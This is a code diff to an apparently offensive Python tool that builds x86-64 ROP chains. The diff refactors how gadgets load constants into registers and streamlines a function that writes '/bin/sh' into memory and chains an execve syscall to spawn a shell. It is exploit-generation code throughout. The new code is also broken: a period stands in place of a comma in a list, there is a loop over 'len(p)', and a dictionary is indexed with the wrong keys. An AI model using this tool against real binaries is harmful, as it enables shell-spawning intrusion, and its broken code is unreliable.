@@ -1,6 +1,7 @@
 import struct
 import sys
 import re
+import itertools
 
 REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
             ]
@@ -66,11 +67,32 @@ def makeLoadConstIntoRegSeq(gadgetList, reg, noClobber):
             ret += writePadding(padding)
             return ret
         return loadConstIntoReg
-
+    
     raise Exception("Unable to find necessary gadgets to load a value into register " + reg)
+
+def makeLoadConstsIntoRegsSeq(gadgetList, regs, noClobber = []):
+    for p in itertools.permutations(regs):
+        try:
+            acc = []
+            regs_done = []
+            for reg in p:
+                acc.append(makeLoadConstIntoRegSeq(gadgetList, reg, noClobber + regs_done))
+                regs_done.append(reg)
+            def loadConstsIntoRegs(consts, comments = [], isOffsets = []):
+                valsToLoad = dict(zip(regs, itertools.zip_longest(consts, comments, isOffsets)))
+                for i in len(p):
+                    reg = p[i]
+                    acc[i](*valsToLoad[i])
+            return loadConstsIntoRegs
+        except Exception: continue
+    raise Exception("No way to load constants into all of the registers " + str(regs) + " in any order.")
+
 
 def LoadConstIntoReg(gadgetList, reg, noClobber, const, comment = '', isOffset = False):
     return makeLoadConstIntoRegSeq(gadgetList, reg, noClobber)(const, comment, isOffset)
+
+def loadConstsIntoRegs(gadgetList, regs, noClobber, consts, comments = [], isOffsets = []):
+    return makeLoadConstsIntoRegsSeq(gadgetList, regs, noClobber)(consts, comments, isOffsets)
 
 def getMovQwordGadgets(gadgets):
     movQwordGadgets = list()
@@ -90,15 +112,8 @@ def makeQwordLoadSeq(gadgetList):
         dest = ops[0][-4:-1]
         src = ops[1]
         try:
-            loadSrcSeq = makeLoadConstIntoRegSeq(gadgetList, src, [])
-            loadDestSeq = makeLoadConstIntoRegSeq(gadgetList, dest, [src])
-            return lambda qword, addr: loadSrcSeq(qword, str(struct.pack("<Q", qword))) + loadDestSeq(addr, "Location to write", True) + writeGadget(g)
-        except Exception:
-            pass
-        try:
-            loadDestSeq = makeLoadConstIntoRegSeq(gadgetList, dest, [], qword)
-            loadSrcSeq = makeLoadConstIntoRegSeq(gadgetList, src, [dest], qword)
-            return lambda qword, addr: loadDestSeq(addr, "Location to write", True) + loadSrcSeq(qword, str(struct.pack("<Q", qword))) + writeGadget(g)
+            loadConsts = makeLoadConstsIntoRegsSeq(gadgetList, [src, dest], [])
+            return lambda qword, addr: loadConsts([qword, addr], [str(struct.pack("<Q", qword)), "Location to write"], [False, True]) + writeGadget(g)
         except Exception:
             continue 
     raise Exception("Could not combine gadgets to write to arbitary memory.") 
@@ -119,10 +134,8 @@ def WriteStuffIntoMemory(GadgetList, data, addr) :
         addr += 8
     return acc
 
-def checkIfSyscallPresent(GadgetList) : 
-
+def getSyscallGadgets(GadgetList):
     syscallList = list()
-
     x = 0
     for gadget in GadgetList:
         if len(gadget) != 1: continue # We're only interested in bare syscall right now.
@@ -151,8 +164,7 @@ footer='''
 \tfd.close()    
 '''
 
-def execveROPChain(GadgetList, elf): 
-
+def execveROPChain(GadgetList, elf):
     print("\n\n-->Chaining to get a shell using execve system call")
     """ Get a section from the file, by name. Return None if no such
             section exists.
@@ -161,35 +173,27 @@ def execveROPChain(GadgetList, elf):
     execve_bin_sh(GadgetList, data_section_addr)
     sys.exit()
 
-def execve_bin_sh(GadgetList, data_section_addr) : 
-
-    # Open the file where the payload is written in the form of a python script
+def execve_bin_sh(GadgetList, data_section_addr):
+    # Step-1: Open the file where the payload is written in the form of a python script
     fd = open("execveROPChain.py", "w")
     fd.write(header)
     
     # Step-2: Writing "/bin/sh\x00" into .data section
     binsh = b'/bin/sh\x00' # TODO: Eliminate this null byte
     fd.write(WriteStuffIntoMemory(GadgetList, binsh, data_section_addr))
-
-
+    
     # TODO: Make a LoadSmallCosntIntoReg that loads constants smaller than 256.
     # We need to prevent null bytes if possible.
-
-    # Step-1: rax <- 59
-    fd.write(LoadConstIntoReg(GadgetList, "rax", [], 59))
-
-	# Step-2: rdi <- "Address of /bin//sh" - .data section's address
-    fd.write(LoadConstIntoReg(GadgetList, "rdi", ["rax"], data_section_addr, isOffset = True))
-
-	# Step-3: rsi <- 0
-    fd.write(LoadConstIntoReg(GadgetList, "rsi", ["rax", "rdi"], 0))
-
-    # Step-4: rdx <- 0
-    fd.write(LoadConstIntoReg(GadgetList, "rdx", ["rax", "rdi", "rsi"], 0))
-
-
+    
+    # Step-3: Write appropriate register values: 
+    # rax <- 59
+    # rdi <- "Address of /bin//sh" - .data section's address
+    # rsi <- 0
+    # rdx <- 0
+    fd.write(loadConstsIntoRegs(GadgetList, ["rax", "rdi", "rsi", "rdx"], [], [59. data_section_addr, 0, 0], isOffsets = [False, True, False, False]))
+    
     # Get syscall
-    syscallList = checkIfSyscallPresent(GadgetList)
+    syscallList = getSyscallGadgets(GadgetList)
     if len(syscallList) == 0: 
         raise Exception("No syscall gadget found.")
     
